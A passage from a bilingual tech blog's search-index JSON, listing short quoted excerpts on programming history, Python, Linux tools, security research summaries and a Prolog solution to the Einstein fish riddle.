danger. For this reason, as early as 1976, the industry standardized on storing passwords using secure, one-way hashing mechanisms (starting with Unix Crypt). Unfortunately, while this prevents the direct reading of passwords in case of a compromise, all hashing mechanisms necessarily allow attackers to brute force the hash offline, by going through lists of possible passwords, hashing them, and comparing the result. In this context, secure hashing functions like SHA have a critical flaw for password hashing: they are designed to be fast. A modern commodity CPU can generate millions of SHA256 hashes per second. Specialized GPU clusters allow for calculating hashes at a rate of billions per second. Devdatta Akhawe | blogs.dropbox.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/24/how-dropbox-securely-stores-your-passwords/","loc":"https://karpoke.ignaciocano.com/2016/09/24/how-dropbox-securely-stores-your-passwords/"},{"title":"The curious case of the switch statement","text":"The earliest incarnation I can find is in ALGOL 58. The original description of ALGOL 58 is a fascinating read — it's written like a math paper, with literal text in italics and heavy use of subscripts. Character classes are even named by Greek letters, with λ representing letters and so on. The example program at the end is completely incomprehensible, with almost every variable being a single letter and labels forming their own entire column on the left side. I guess that last bit came from FORTRAN. Eevee | eev.ee","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/22/the-curious-case-of-the-switch-statement/","loc":"https://karpoke.ignaciocano.com/2016/09/22/the-curious-case-of-the-switch-statement/"},{"title":"Programming Pearls and Python fails","text":"Computer science books contains timeless wisdom, but performance advice doesn't always age well. When reading Programming Pearls, by Jon Bentley, I've found more modern hardware advances that puts conventional wisdom on its head. Franklin He | medium.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/22/programming-pearls-and-python-fails/","loc":"https://karpoke.ignaciocano.com/2016/09/22/programming-pearls-and-python-fails/"},{"title":"Los tres años que cambiaron para siempre la industria del videojuego","text":"Es un periodo en la historia del software bien diferenciado. Uno en el que muchos jugadores se sumaron a la industria, sin saber apenas qué había antes. Probablemente también fueron los años en los que nacieron un mayor número de propiedades intelectuales. Y también es el inicio de la generación PlayStation, asentándose un modelo de negocio (consumo rápido, gran oferta de videojuegos) que permanece hasta nuestros días. Hablamos de una época que empieza en 1993 y acaba en 1996. Tres años en los que los videojuegos en dos dimensiones pasaron de dominar la industria (y ser casi el único camino viable en ella) a prácticamente desaparecer por completo. Javier Ortizá | malavida.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/18/los-tres-anos-que-cambiaron-para-siempre-la-industria-del-videojuego/","loc":"https://karpoke.ignaciocano.com/2016/09/18/los-tres-anos-que-cambiaron-para-siempre-la-industria-del-videojuego/"},{"title":"Volcado de memoria #RAM en #Linux - #LiME","text":"En primer lugar, igual que hice en la entrada anterior \"Volcado de memoria RAM en Windows – OSForensics\", voy a recordar la importancia de las buenas prácticas, recordando la necesidad de conocer y seguir la RFC 3227 , que lleva por título \"Guidelines for Evidence Collection and Archiving\", (Directrices para la recolección y archivo de la Evidencia). Vuelvo a decir: recomiendo encarecidamente su lectura. En esta ocasión, vamos a realizar un volcado de memoria de un sistema Linux. Para ello, vamos a usar LiME , (Linux Memory Extractor). LiME es una herramienta desarrollada por 504ensics Labs, de código abierto, que permite la adquisición de la memoria volátil de sistemas Linux y dispositivos basados en Linux, como Android, y que trabaja a nivel de kernel. @ N4rr34n6 | fwhibbit.blogpost.com.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/17/volcado-de-memoria-ram-en-linux-lime/","loc":"https://karpoke.ignaciocano.com/2016/09/17/volcado-de-memoria-ram-en-linux-lime/"},{"title":"A guide to fix hacked WordPress sites","text":"Our content, web design, and development teams spent months putting together a brand new guide to walk users through the process of identifying and clearing a WordPress hack, as well as ensuring post-hack actions are taken using the free Sucuri plugin. Alycia Mitchell | sucuri.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/17/a-guide-to-fix-hacked-wordpress-sites/","loc":"https://karpoke.ignaciocano.com/2016/09/17/a-guide-to-fix-hacked-wordpress-sites/"},{"title":"Transistors - The invention that changed the world","text":"Real Engineering | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/17/transistors-the-invention-that-changed-the-world/","loc":"https://karpoke.ignaciocano.com/2016/09/17/transistors-the-invention-that-changed-the-world/"},{"title":"La estética del código fuente: a la búsqueda del Arte en la Programación","text":"Un lenguaje informático no es más que un conjunto de instrucciones que introducimos en una máquina para que esta opere permitiéndonos así desarrollar programas. De este modo, las distintas formas en que combinamos dichas instrucciones dan lugar a los diferentes estilos y escuelas responsables de lo que podemos denominar ‘la estética de la programación‘. Esa estética, según las reglas a las que responda, se puede clasificar a su vez en cuatro grandes grupos que tradicionalmente, como muchas corrientes artísticas, han coexistido de forma simultánea… Carlos Benítez | etnassoft.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/16/la-estetica-del-codigo-fuente-a-la-busqueda-del-arte-en-la-programacion/","loc":"https://karpoke.ignaciocano.com/2016/09/16/la-estetica-del-codigo-fuente-a-la-busqueda-del-arte-en-la-programacion/"},{"title":"Mr. Robot S02E06: easter eggs más elaborados y un curso acelerado de hacking","text":"Volvemos a la crónica tecnológica de Mr. Robot con el análisis del sexto capítulo de la segunda temporada. El inicio nos dejó bastante descolocados a casi todos los seguidores de la serie, especialmente por el cambio de registro. No vamos a entrar en detalles puesto que es una sorpresa que merece que cada uno vea libre de spoilers pero, personalmente, creo que es de lo mejor que se ha hecho en televisión en los últimos años. A partir de este punto se comentan SPOILERS por lo que recomendamos leer solo si estás dispuesto a conocer algún que otro detalle del episodio Mr. Robot S02E06. Josep Albors | welivesecurity.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/11/mr-robot-s02e06-easter-eggs-mas-elaborados-y-un-curso-acelerado-de-hacking/","loc":"https://karpoke.ignaciocano.com/2016/09/11/mr-robot-s02e06-easter-eggs-mas-elaborados-y-un-curso-acelerado-de-hacking/"},{"title":"The simple solution to eliminate traffic","text":"Here's a simple way to make traffic disappear. » CPG Grey | via geeksaresexy.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/11/the-simple-solution-to-eliminate-traffic/","loc":"https://karpoke.ignaciocano.com/2016/09/11/the-simple-solution-to-eliminate-traffic/"},{"title":"Reverse debugging for Python","text":"A \"reverse debugger\" is a debugger where you can go forward and backward in time. It is an uncommon feature, at least in the open source world, but I have no idea why. I have used undodb-gdb and rr, which are reverse debuggers for C code, and I can only say that they saved me many, many days of poking around blindly in gdb. The PyPy team is pleased to give you \"RevPDB\", a reverse-debugger similar to rr but for Python. Armin Rigo | morepypy.blogspot.com.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/11/reverse-debugging-for-python/","loc":"https://karpoke.ignaciocano.com/2016/09/11/reverse-debugging-for-python/"},{"title":"datetime vs Arrow vs Pendulum vs Delorean vs udatetime","text":"So I setup a benchmark, which can be found here to compare Python datetime, Arrow, Pendulum, Delorean and udatetime on a performance level. I picked 4 typical performance critical operations to measure the speed of those libraries. Decode a date-time string Encode (serialize) a date-time string Instantiate object with current time in UTC Instantiate object with current time in local timezone Instantiate object from timestamp in UTC Instantiate object from timestamp in local timezone Simon Pirschel | aboutsimon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/11/datetime-vs-arrow-vs-pendulum-vs-delorean-vs-udatetime/","loc":"https://karpoke.ignaciocano.com/2016/09/11/datetime-vs-arrow-vs-pendulum-vs-delorean-vs-udatetime/"},{"title":"Editor wars: the revenge of vim","text":"Al, like a lot of you out there, thinks that he \"knows how to use vi\". I'm here to tell you that he doesn't. And unless you've spent the last few years alone in a cave high in the Himalayas, with only food, drink, a laptop, and Vim Golf, you probably don't either. Heck, I don't consider myself a Vim master, but I'm going to write this overwrought essay praising it (using Vim, naturally). Elliot Williams | hackaday.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/11/editor-wars-the-revenge-of-vim/","loc":"https://karpoke.ignaciocano.com/2016/09/11/editor-wars-the-revenge-of-vim/"},{"title":"Demystifying the regular expression that checks if a number is prime","text":"A while back I was researching the most efficient way to check if a number is prime. This lead me to find the following piece of code: public static boolean isPrime(int n) { return !new String(new char[n]).matches(\".?|(..+?)\\\\1+\"); } I was intrigued. While this might not be the most efficient way, it's certainly one of the less obvious ones, so my curiosity kicked in. How on Earth could a match for the .?|(..+?)\\1+ regular expression tell that a number is not prime (once it's converted to its unary representation)? iluxonchik | iluxonchik.github.io","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/09/10/demystifying-the-regular-expression-that-checks-if-a-number-is-prime/","loc":"https://karpoke.ignaciocano.com/2016/09/10/demystifying-the-regular-expression-that-checks-if-a-number-is-prime/"},{"title":"Motivos por los que recomiendo usar la distribución Debian en Linux","text":"Llevo más de 5 años usando Debian y la verdad es que estoy más que satisfecho. De momento no me planteo cambiar de distribución básicamente por los siguientes motivos: Sus repositorios son excelentes La metodologia de desarrollo seguida por debian Estabilidad y seguridad Soporte existente para la distribución Ofrece múltiples posibilidades de instalación y uso Filosofia de la distribución La instalo una vez y me olvido para siempre Joan | geekland.eu","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/08/14/motivos-por-los-que-recomiendo-usar-la-distribucion-debian-en-linux/","loc":"https://karpoke.ignaciocano.com/2016/08/14/motivos-por-los-que-recomiendo-usar-la-distribucion-debian-en-linux/"},{"title":"Meterpretear una apk","text":"Primero digamos que en este post vamos a tocar los temas de las APKs de Android, que es el formato utilizado para empaquetar las aplicaciones. También vamos a tocar Metasploit, una gran herramienta para los pentesters, esta herramienta se basa en módulos los cuales permiten hacer (sobre todo intentos) de explotación de sistemas, con los módulos de exploit que cuenta la herramienta, o módulos auxiliares. Usaremos dos de las herramientas con las que cuenta metasploit: msfvenom (para generar payloads, dando la posibilidad de pasarlos por un encoder) y msfconsole (consola de comandos para hacer uso de exploits, modulos auxiliares...). Vamos a realizar un sencillo proceso de Ingeniería inversa en android, pero bastante sencillo. Fare9 | estacion-informatica.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/08/14/meterpretear-una-apk/","loc":"https://karpoke.ignaciocano.com/2016/08/14/meterpretear-una-apk/"},{"title":"Lepton image compression: saving 22% losslessly from images at 15MB/s","text":"Lepton achieves a 22% savings reduction for existing JPEG images, by predicting coefficients in JPEG blocks and feeding those predictions as context into an arithmetic coder. Lepton preserves the original file bit-for-bit perfectly. It compresses JPEG files at a rate of 5 megabytes per second and decodes them back to the original bits at 15 megabytes per second, securely, deterministically, and in under 24 megabytes of memory. Daniel Reiter Horn | dropbox.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/07/17/lepton-image-compression-saving-22-percent-losslessly-from-images-at-15mbps/","loc":"https://karpoke.ignaciocano.com/2016/07/17/lepton-image-compression-saving-22-percent-losslessly-from-images-at-15mbps/"},{"title":"Programming the Pi over USB","text":"A comprehensive video covering how to set up your Raspberry Pi Zero so that you can access it via the USB port. Yes, plug it in to a USB port and you can use the command line or with a few tweaks a full graphical desktop. Great for on the go or when another monitor or screen is not suitable. (It even supports Minecraft which can be played) Te Co Ed | youtube.com | via raspberrypi.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/07/10/programming-the-pi-over-usb/","loc":"https://karpoke.ignaciocano.com/2016/07/10/programming-the-pi-over-usb/"},{"title":"How We Teach Computers to Understand Pictures","text":"When a very young child looks at a picture, she can identify simple elements: \"cat,\" \"book,\" \"chair.\" Now, computers are getting smart enough to do that too. What's next? In a thrilling talk, computer vision expert Fei-Fei Li describes the state of the art — including the database of 15 million photos her team built to \"teach\" a computer to understand pictures — and the key insights yet to come. Fei Fei Li | youtube.com | via xombra.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/06/29/how-we-teach-computers-to-understand-pictures/","loc":"https://karpoke.ignaciocano.com/2016/06/29/how-we-teach-computers-to-understand-pictures/"},{"title":"Sentirás nostalgia al ver los puertos que has utilizado en tu PC","text":"Los que llevamos unos cuantos años utilizando ordenadores hemos visto pasar por nuestras manos todo tipo de puertos. Hasta la introducción y estandarización del USB, muchos de los dispositivos que utilizábamos tenían conectores diferentes, y algunos hasta propietarios. Vamos a recordar algunos de ellos. Alberto García | adslzone.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/06/28/sentiras-nostalgia-al-ver-los-puertos-que-has-utilizado-en-tu-pc/","loc":"https://karpoke.ignaciocano.com/2016/06/28/sentiras-nostalgia-al-ver-los-puertos-que-has-utilizado-en-tu-pc/"},{"title":"Así es como la ingeniería inversa cambió la historia de la informática para siempre","text":"IBM era el dueño y señor de los bits y los bytes a principios de los 80. En aquella época Apple, Microsoft y los fabricantes de aquellos legendarios ordenadores de 8 bits también despuntaban, pero todo daba igual: el gigante azul dominaba con mano firme la informática empresarial, y para muestra un botón: el PC no se llamaba PC. Se llamaba IBM PC. Javier Pastor | xataka.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/06/13/asi-es-como-la-ingenieria-inversa-cambio-la-historia-de-la-informatica-para-siempre/","loc":"https://karpoke.ignaciocano.com/2016/06/13/asi-es-como-la-ingenieria-inversa-cambio-la-historia-de-la-informatica-para-siempre/"},{"title":"Solving Unicode Problems in Python 2.7","text":"One of the toughest things to get right in a Python program is Unicode handling. If you're reading this, you're probably in the middle of discovering this the hard way. The main reasons Unicode handling is difficult in Python is because the existing terminology is confusing, and because many cases which could be problematic are handled transparently. This prevents many people from ever having to learn what's really going on, until suddenly they run into a brick wall when they want to handle data that contains characters outside the ASCII character set. Derek Dohler | azavea.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/06/08/solving-unicode-problems-in-python-2-7/","loc":"https://karpoke.ignaciocano.com/2016/06/08/solving-unicode-problems-in-python-2-7/"},{"title":"La polémica SystemD","text":"Es un programa que genera una inmensa polémica, del que se está oyendo hablar cada vez más y que es utilizado por la mayoría de distribuciones. Sus detractores son muchos, sin embargo es utilizado cada vez por más distribuciones Linux. Así que surgen las preguntas. ¿Porqué SystemD es tan malo? Y si es tan malo, ¿porqué cada vez más distribuciones lo están utilizando? Amancio | lignux.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/06/05/la-polemica-systemd/","loc":"https://karpoke.ignaciocano.com/2016/06/05/la-polemica-systemd/"},{"title":"El origen del tono que escuchamos al hacer una llamada","text":"Hay aspectos tan mínimos en lo que usamos a diario que a menudo no reparamos en ellos hasta que, de repente, nos los cambian. Un ejemplo es esto que comentaremos ahora: ¿suenan igual todos los tonos de espera tras el marcado? Si sólo llamáis a contactos de vuestro país no habréis notado la diferencia, pero la cosa cambia para las llamadas internacionales. Ivan Linares | elandroidelibre.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/06/02/el-origen-del-tono-que-escuchamos-al-hacer-una-llamada/","loc":"https://karpoke.ignaciocano.com/2016/06/02/el-origen-del-tono-que-escuchamos-al-hacer-una-llamada/"},{"title":"The Joel Test: 12 Steps to Better Code","text":"Have you ever heard of SEMA? It's a fairly esoteric system for measuring how good a software team is. No, wait! Don't follow that link! It will take you about six years just to understand that stuff. So I've come up with my own, highly irresponsible, sloppy test to rate the quality of a software team. The great part about it is that it takes about 3 minutes. With all the time you save, you can go to medical school. Joel Spolsky | joelonsoftware.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/05/31/the-joel-test:-12-steps-to-better-code/","loc":"https://karpoke.ignaciocano.com/2016/05/31/the-joel-test:-12-steps-to-better-code/"},{"title":"España y el software que fue","text":"La abadía del crimen fue publicado en 1987, en el cénit de los viejos microordenadores de 8-bits. Sus diseñadores, Paco Menéndez y Juan Delcán, lo diseñaron en un Amstrad CPC6128, el último gran ordenador de ese periodo —tecnología punta de 1985, con 128 KB de RAM y una inusual disquetera de tres pulgadas. Roger Senserrich | jotdown.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/02/29/espana-y-el-software-que-fue/","loc":"https://karpoke.ignaciocano.com/2016/02/29/espana-y-el-software-que-fue/"},{"title":"The history behind the decision to move Python to GitHub","text":"I asked on Twitter if people would be interested in having me write down the history behind my decision to choose GitHub for Python's future development process and people said \"yes\"(some literally), hence this blog post. Brett Cannon | snarky.ca","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/02/07/the-history-behind-the-decision-to-move-python-to-github/","loc":"https://karpoke.ignaciocano.com/2016/02/07/the-history-behind-the-decision-to-move-python-to-github/"},{"title":"How to C in 2016","text":"The first rule of C is don't write C if you can avoid it. If you must write in C, you should follow modern rules. C has been around since the early 1970s. People have \"learned C\" at various points during its evolution, but knowledge usually get stuck after learning, so everybody has a different set of things they believe about C based on the year(s) they first started learning. Matt | matt.sh","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/02/07/how-to-c-in-2016/","loc":"https://karpoke.ignaciocano.com/2016/02/07/how-to-c-in-2016/"},{"title":"¿Cuál es el origen de \"Hello world\"?","text":"Brian Kernighan, autor de uno de los libros de programación más famosos de la historia: C Progamming Language (1978). Previamente, también habría escrito en 1973 un libro llamado A Tutorial Introduction to the Programming Language B, en el cual introdujo por primera vez el ejemplo del famoso \"Hello World\" Nicolás Rivera | hipertextual.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/02/07/cual-es-el-origen-de-hello-world/","loc":"https://karpoke.ignaciocano.com/2016/02/07/cual-es-el-origen-de-hello-world/"},{"title":"Los geniales Huevos de Pascua de LucasArts","text":"La facilidad de manejo gracias al motor SCUMM y la mezcla única de una buena historia y muchos toques de humor que LucasArts aplicaba en sus aventuras gráficas, se convirtieron a la vez en garantía de calidad y su sello personal. Además del humor que podemos encontrar durante la trama, LucasArts escondió también en sus aventuras gráficas numerosos huevos de pascua y guiños a sus películas o a otros videojuegos. » tabernadegrog.blogspot.com.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/02/07/los-geniales-huevos-de-pascua-de-lucasarts/","loc":"https://karpoke.ignaciocano.com/2016/02/07/los-geniales-huevos-de-pascua-de-lucasarts/"},{"title":"Why ‘print' became a function in Python 3","text":"But the real key to the print function is somewhat subtle and it all has to do with flexibility, both for the users and the Python development team. For users, making print a function lets you use print as an expression, unlike the print statement which can only be used as a statement. Brett Cannon | snarky.ca","tags":"micropost","url":"https://karpoke.ignaciocano.com/2016/01/31/why-print-became-a-function-in-python-3/","loc":"https://karpoke.ignaciocano.com/2016/01/31/why-print-became-a-function-in-python-3/"},{"title":"«¿De quién es el pez?», resuelto mediante Prolog","text":"Éste es un viejo acertijo lógico , atribuido a Einstein: El inglés vive en la casa roja. El sueco tiene perro. El danés toma té. El noruego vive en la primera casa. El Alemán fuma Prince. La casa verde queda inmediatamente a la izquierda de la blanca. El dueño de la casa verde toma café. La persona que fuma Pall Mall cría pájaros. El dueño de la casa amarilla fuma Dunhill. El hombre que vive en la casa del centro toma leche. El hombre que fuma Blends vive al lado del que tiene un gato. El hombre que tiene un caballo vive al lado del que fuma Dunhill. El hombre que fuma Bluemaster toma cerveza. El hombre que fuma Blends es vecino del que toma agua. El noruego vive al lado de la casa azul. Ante estas afirmaciones, la pregunta es: ¿de quién es el pez? Veamos una manera de resolverlo utilizando Prolog: ```prolog insertar(E, L, [E|L]). insertar(E, [X|Y], [X|Z]):-insertar(E, Y, Z). permutacion([], []). permutacion([X|Y], Z):-permutacion(Y, L), insertar(X, L, Z). posicion(X, [X|L], 1). posicion(Y, [X|L], Z):-posicion(Y, L, R), Z is R+1. izquierda(X1, X2, L):-posicion(X1, L, P1), posicion(X2, L, P2), P2 is P1+1. vecinos(P1, P2):-P1 is P2+1;P2 is P1+1. escribir(A, B, C, D, E):-writeln(A), writeln(B), writeln(C), writeln(D), writeln(E). de-quien-es-el-pez(L1, L2, L3, L4, L5):- permutacion([ingles, sueco, danes, noruego, aleman], L1), permutacion([roja, blanca, verde, amarilla, azul], L2), /_ 1. El inglés vive en la casa roja. _/ posicion(ingles, L1, P1), posicion(roja, L2, P1), permutacion([perro, pajaros, gato, caballo, pez], L3), /_ 2. El sueco tiene perro. _/ posicion(sueco, L1, P2), posicion(perro, L3, P2), permutacion([te, cafe, leche, cerveza, agua], L4), /_ 3. El danés toma té. _/ posicion(danes, L1, P3), posicion(te, L4, P3), /_ 4. El noruego vive en la primera casa. _/ posicion(noruego, L1, P4), P4 is 1, permutacion([prince, pallmall, dunhill, blends, bluemaster], L5), /_ 5. El Alemán fuma Prince. _/ posicion(aleman, L1, P5), posicion(prince, L5, P5), /_ 6. La casa verde queda inmediatamente a la izquierda de la blanca. _/ izquierda(verde, blanca, L2), /_ 7. El dueño de la casa verde toma café. _/ posicion(verde, L2, P6), posicion(cafe, L4, P6), /_ 8. La persona que fuma Pall Mall cría pájaros. _/ posicion(pallmall, L5, P7), posicion(pajaros, L3, P7), /_ 9. El dueño de la casa amarilla fuma Dunhill. _/ posicion(amarilla, L2, P8), posicion(dunhill, L5, P8), /_ 10. El hombre que vive en la casa del centro toma leche. _/ posicion(leche, L4, P9), P9 is 3, /_ 11. El hombre que fuma Blends vive al lado del que tiene un gato. _/ posicion(blends, L5, P10), posicion(gato, L3, P11), vecinos(P10, P11), /_ 12. El hombre que tiene un caballo vive al lado del que fuma Dunhill. _/ posicion(caballo, L3, P12), vecinos(P8, P12), /_ 13. El hombre que fuma Bluemaster toma cerveza. _/ posicion(bluemaster, L5, P13), posicion(cerveza, L4, P13), /_ 14. El hombre que fuma Blends es vecino del que toma agua. _/ posicion(agua, L4, P14), vecinos(P10, P14), /_ 15. El noruego vive al lado de la casa azul. _/ posicion(azul, L2, P15), vecinos(P1, P15). main:- de-quien-es-el-pez(L1, L2, L3, L4, L5), escribir(L1, L2, L3, L4, L5). main. ``` Y la solución: prolog [noruego,danes,ingles,aleman,sueco] [amarilla,azul,roja,verde,blanca] [gato,caballo,pajaros,pez,perro] [agua,te,leche,cafe,cerveza] [dunhill,blends,pallmall,prince,bluemaster]","tags":"dev","url":"https://karpoke.ignaciocano.com/2015/12/26/de-quien-es-el-pez-resuelto-mediante-prolog/","loc":"https://karpoke.ignaciocano.com/2015/12/26/de-quien-es-el-pez-resuelto-mediante-prolog/"},{"title":"Relatividad general, ondulaciones en el espaciotiempo","text":"La teoría del electromagnetismo viene codificada en cuatro ecuaciones, solo cuatro, las ecuaciones de Maxwell. Estas ecuaciones controlan todos los procesos electromagnéticos conocidos, todos, al menos a nivel clásico. Eso no está mal del todo porque el electromagnetismo es la piedra angular de nuestra tecnología y, de paso, de nuestra química. » cuentos-cuanticos.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/11/07/relatividad-general-ondulaciones-en-el-espaciotiempo/","loc":"https://karpoke.ignaciocano.com/2015/11/07/relatividad-general-ondulaciones-en-el-espaciotiempo/"},{"title":"Lo que sucede cuando un software se convierte en un agujero negro","text":"Fue a Bjarne Stroustrup a quién le leí que \"un sistema grande y complejo que no ha evolucionado a partir de otro más simple que funcionaba bien, no funciona y, además, es imposible arreglarlo para que funcione\" (creo que esto es del libro The Design and Evolution of C++ publicado en 1994). Tal hipótesis se comprobó empíricamente muchas veces en el siglo XX y es por eso que se cambió el foco a proyectos ágiles. Sergio Montoro | lapastillaroja.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/11/07/lo-que-sucede-cuando-un-software-se-convierte-en-un-agujero-negro/","loc":"https://karpoke.ignaciocano.com/2015/11/07/lo-que-sucede-cuando-un-software-se-convierte-en-un-agujero-negro/"},{"title":"10 ways to ruin your start-up's culture, in cartoons","text":"Liz Fosslien and Mollie West | qz.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/11/07/10-ways-to-ruin-your-start-ups-culture-in-cartoons/","loc":"https://karpoke.ignaciocano.com/2015/11/07/10-ways-to-ruin-your-start-ups-culture-in-cartoons/"},{"title":"Probability, Paradox, and the Reasonable Person Principle","text":"In this notebook, we cover the basics of probability theory, and show how to implement the theory in Python. Peter Norvig | nbviewer.ipython.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/10/17/probability-paradox-and-the-reasonable-person-principle/","loc":"https://karpoke.ignaciocano.com/2015/10/17/probability-paradox-and-the-reasonable-person-principle/"},{"title":"RebornDB: The next generation distributed key-value store","text":"Redis is advanced key-value cache and store, under BSD license. It is very fast, has many data types(String, Hash, List, Set, Sorted Set …), uses RDB or AOF persistence and replication to guarantee data security, and supplies many language client libraries. Most of all, market chooses Redis. There are many companies using Redis and it has proved its worth. Although redis is greate, it still has some disadvantages, and the biggest one is memory limitation. Redis keeps all data in memory, which limits the whole dataset size and lets us save more data impossibly. siddon tang | highscalability.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/07/08/reborndb-the-next-generation-distributed-key-value-store/","loc":"https://karpoke.ignaciocano.com/2015/07/08/reborndb-the-next-generation-distributed-key-value-store/"},{"title":"Stealing Keys from PCs using a Radio: Cheap Electromagnetic Attacks on Windowed Exponentiation","text":"We demonstrate the extraction of secret decryption keys from laptop computers, by nonintrusively measuring electromagnetic emanations for a few seconds from a distance of 50 cm. The attack can be executed using cheap and readily-available equipment: a consumer-grade radio receiver or a Software Defined Radio USB dongle. The setup is compact and can operate untethered; it can be easily concealed, e.g., inside pita bread. Common laptops, and popular implementations of RSA and ElGamal encryptions, are vulnerable to this attack, including those that implement the decryption using modern exponentiation algorithms such as sliding-window, or even its side-channel resistant variant, fixed-window (m-ary) exponentiation. We successfully extracted keys from laptops of various models running GnuPG (popular open source encryption software, implementing the OpenPGP standard), within a few seconds. The attack sends a few carefully-crafted ciphertexts, and when these are decrypted by the target computer, they trigger the occurrence of specially-structured values inside the decryption software. These special values cause observable fluctuations in the electromagnetic field surrounding the laptop, in a way that depends on the pattern of key bits (specifically, the key-bits window in the exponentiation routine). The secret key can be deduced from these fluctuations, through signal processing and cryptanalysis. » tac.ac.il","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/06/25/stealing-keys-from-pcs-using-a-radio-cheap-electromagnetic-attacks-on-windowed-exponentiation/","loc":"https://karpoke.ignaciocano.com/2015/06/25/stealing-keys-from-pcs-using-a-radio-cheap-electromagnetic-attacks-on-windowed-exponentiation/"},{"title":"A flaw in the design (Part I)","text":"David D. Clark, an MIT scientist whose air of genial wisdom earned him the nickname \"Albus Dumbledore,\" can remember exactly when he grasped the Internet's dark side. He was presiding over a meeting of network engineers when news broke that a dangerous computer worm — the first to spread widely — was slithering across the wires. One of the engineers, working for a leading computer company, piped up with a claim of responsibility for the security flaw that the worm was exploiting. \"Damn,\" he said. \"I thought I had fixed that bug.\" But as the attack raged in November 1988, crashing thousands of machines and causing millions of dollars in damage, it became clear that the failure went beyond a single man. The worm was using the Internet's essential nature — fast, open and frictionless — to deliver malicious code along computer lines designed to carry harmless files or e-mails. Craig Timberg | washingtonpost.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/06/13/a-flaw-in-the-design-part-i/","loc":"https://karpoke.ignaciocano.com/2015/06/13/a-flaw-in-the-design-part-i/"},{"title":"A repository with 44 years of Unix evolution","text":"The evolution of the Unix operating system is made available as a version-control repository, covering the period from its inception in 1972 as a five thousand line kernel, to 2015 as a widely-used 26 million line system. The repository contains 659 thousand commits and 2306 merges. The repository employs the commonly used Git system for its storage, and is hosted on the popular GitHub archive. It has been created by synthesizing with custom software 24 snapshots of systems developed at Bell Labs, Berkeley University, and the 386BSD team, two legacy repositories, and the modern repository of the open source FreeBSD system. In total, 850 individual contributors are identified, the early ones through primary research. The data set can be used for empirical research in software engineering, information systems, and software archaeology. Diomidis Spinellis | aueb.gr","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/06/06/a-repository-with-44-years-of-unix-evolution/","loc":"https://karpoke.ignaciocano.com/2015/06/06/a-repository-with-44-years-of-unix-evolution/"},{"title":"A Map Of The Most Common Paths For All 32 Chess Pieces","text":"There are just 32 pieces on a chessboard, but the number of patterns in which those pieces can move in the course of an individual game are astronomical. Still, as these maps show, despite all those different possibilities, each piece has a pretty clear pattern behind it. The maps, which track the most common trajectories of each chess piece, are the works of Steve Tung. Tung explained the process behind the maps to io9, noting that each map represents condensed data from over 2 million individual games of chess. Ria Misra | io9.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/06/04/a-map-of-the-most-common-paths-for-all-32-chess-pieces/","loc":"https://karpoke.ignaciocano.com/2015/06/04/a-map-of-the-most-common-paths-for-all-32-chess-pieces/"},{"title":"Alfonso Azpiri y la época dorada del software español","text":"Por aquel entonces, Azpiri se había ganado merecidamente su fama de buen dibujante en periódicos, revistas y álbumes de historietas, por lo que Dinamic contactó con él para realizar su primera portada de un videojuego, el famoso ‘Rocky‘ de 1985. Poco después, en el mismo año, ilustró la aventura ‘Abu Simbel, Profanation‘, para el que escribe uno de los mejores, más adictivos y complicados videojuegos de la historia del entretenimiento digital. Jonathan Préstamo Rodríguez | teknoplof.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/30/alfonso-azpiri-y-la-epoca-dorada-del-software-espanol/","loc":"https://karpoke.ignaciocano.com/2015/05/30/alfonso-azpiri-y-la-epoca-dorada-del-software-espanol/"},{"title":"Cómo la Dama se convirtió en la pieza más poderosa del Ajedrez","text":"La Dama en el Ajedrez no siempre tuvo los movimientos que tiene hoy, de hecho esta figura femenina ni siquiera existía en el tablero. Esta es la historia de como la Dama del Ajedrez se convirtió en la pieza más poderosa. Gabriela González | hipertextual.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/30/como-la-dama-se-convirtio-en-la-pieza-mas-poderosa-del-ajedrez/","loc":"https://karpoke.ignaciocano.com/2015/05/30/como-la-dama-se-convirtio-en-la-pieza-mas-poderosa-del-ajedrez/"},{"title":"Guide for Technical Development","text":"Having a solid foundation in Computer Science is important to become a successful Software Engineer. This guide is a suggested path for university students to develop their technical skills academically and non-academically through self paced hands-on learning. You may use this guide to determine courses to take, but please make sure you are taking courses required for your major in order to graduate. The online resources provided in this guide are not meant to replace courses available at your university. However, they may help 